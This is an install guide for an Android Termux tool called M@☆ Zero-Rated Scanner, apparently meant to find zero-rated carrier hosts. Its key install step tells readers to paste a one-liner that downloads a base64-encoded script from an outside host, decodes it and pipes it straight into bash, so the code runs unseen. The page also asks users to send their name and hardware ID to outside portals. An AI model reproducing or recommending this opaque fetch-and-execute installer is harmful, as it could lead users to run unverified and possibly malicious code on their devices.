What is M@☆ Zero-Rated Scanner?

M@☆ Zero-Rated Scanner v76.45 — precision zero-rated network discovery and host analysis running in Termux

M@☆ Zero-Rated Scanner is a precision network discovery and host analysis framework built specifically for Android via Termux. It provides advanced scanning capabilities including multi-threaded host enumeration, batch processing, adaptive timeout control, and an intelligent rescan engine that filters timeout and blocked hosts.

What you get
A fully-featured zero-rated network scanner running on your Android device inside Termux — thread ranges up to 1000+, batch processing up to 1000+, extended timeout control, rescan engine, advanced options, and hardware architecture detection. Registration-gated with a personal V-Key for verified access.

Current version: v76.45. Key capabilities include an improved accuracy engine, expanded thread and batch processing ranges, rescan engine with smart host filtering, advanced options panel, and 64-bit device support (32-bit coming soon).

03

Getting Termux

M@☆ Zero-Rated Scanner runs entirely inside Termux on Android. You need to install Termux first. There are multiple sources available — the official F-Droid / GitHub builds are strongly recommended over the Play Store version, which has limited features and is no longer actively maintained.

Do not mix sources
GitHub, F-Droid, and the Play Store each sign Termux with a different key. If you install from one source and update from another, Android will block the update with INSTALL_FAILED_UPDATE_INCOMPATIBLE. Pick one source and always update from the same place.

04

Set Up Termux

Open Termux after installing it. Before running the scanner, update the package manager and all base packages to ensure you have the latest runtime environment.

Step 1 — Update package lists and upgrade all packages:

bash 
$ pkg update && pkg upgrade -y

If prompted to replace any config files, press N to keep the existing version. The upgrade may take a few minutes depending on your connection.

Step 2 — Install required dependencies:

bash 
$ pkg install curl wget -y
What each package does
PackagePurpose
curlDownloads and pipes the scanner install script
wgetAlternative HTTP client used internally by the scanner
05

Check Your Device Architecture

M@☆ Zero-Rated Scanner v76.45 currently supports 64-bit devices. Before installing, verify your device's CPU architecture to confirm compatibility.

Run this command in Termux to check your architecture:

bash 
$ getprop ro.product.cpu.abi
arm64-v8a
ResultArchitectureStatus
arm64-v8a 64-bit ARM ✅ Supported
x86_64 64-bit x86 ✅ Supported
armeabi-v7a 32-bit ARM 🚧 Coming Soon
Most modern Androids are 64-bit
Any Android device released after 2017 is almost certainly running a 64-bit processor. If you see arm64-v8a or x86_64, you're good to go.
06

Install the Scanner

With Termux updated and your architecture confirmed as 64-bit, you're ready to install. The installer downloads and decodes the scanner framework in a single command.

Run the installer (copy and paste into Termux):

bash 
$ curl -sL https://mspy.qzz.io/M0scan | base64 -d | bash
What this command does
PartPurpose
curl -sLFetches the installer silently, following any redirects
base64 -dDecodes the base64-encoded installer payload
bashExecutes the decoded installer script
Keep Termux open during install
The installer may download additional components depending on your device. Disable Android's screen timeout before running to prevent the install from stalling mid-way.
07

Verification & V-Key Registration

M@☆ Zero-Rated Scanner uses a hardware-bound verification system. After installation, you need to register your name and Hardware ID (HW-ID) to receive a personal V-Key that unlocks full scanner functionality.

The PIN for registration is: 202614

1
Get your HW-ID
The scanner will display your device's unique Hardware ID on first run. Copy it — you'll need it for registration.
2
Visit the Registration Portal
Go to mastersdeovex.co.za or mspy.qzz.io/tkmasterinfo to access the V-Key registration portal.
3
Submit Your Name + HW-ID
Fill in your name and paste your Hardware ID into the registration form. Submit to begin the verification process.
4
Receive & Enter Your V-Key
You'll receive a unique, personal V-Key tied to your device. Enter it into the scanner prompt to activate all features.
V-Keys are device-bound
Your V-Key is generated specifically for your device's Hardware ID. It will not work on a different device. If you change devices, you'll need to re-register via the portal.

Troubleshooting

Common issues and how to fix them.

curl: command not found
Run pkg install curl -y in Termux first, then re-run the installer command.
INSTALL_FAILED_UPDATE_INCOMPATIBLE when installing Termux
You have a Termux version from a different source already installed (e.g. the Play Store). Uninstall the existing Termux completely first, then install from the official source (GitHub or F-Droid).
Installer stalls or download fails mid-way
Your connection dropped or the screen timed out. Disable Android's screen timeout in Settings, then re-run the install command from the beginning.
V-Key not accepted / invalid key error
Your V-Key is tied to your exact HW-ID. Make sure you submitted the correct HW-ID during registration and that you copied the V-Key exactly as received — no extra spaces. If the issue persists, re-register via the portal.
Device architecture not supported
If getprop ro.product.cpu.abi returns armeabi-v7a, your device is 32-bit and support is not yet available in v76.45. 32-bit support is actively in development — check back for updates.
Scanner exits immediately after launch
This usually means Termux packages are outdated. Run pkg update && pkg upgrade -y and then re-run the installer to get the latest version of all dependencies.
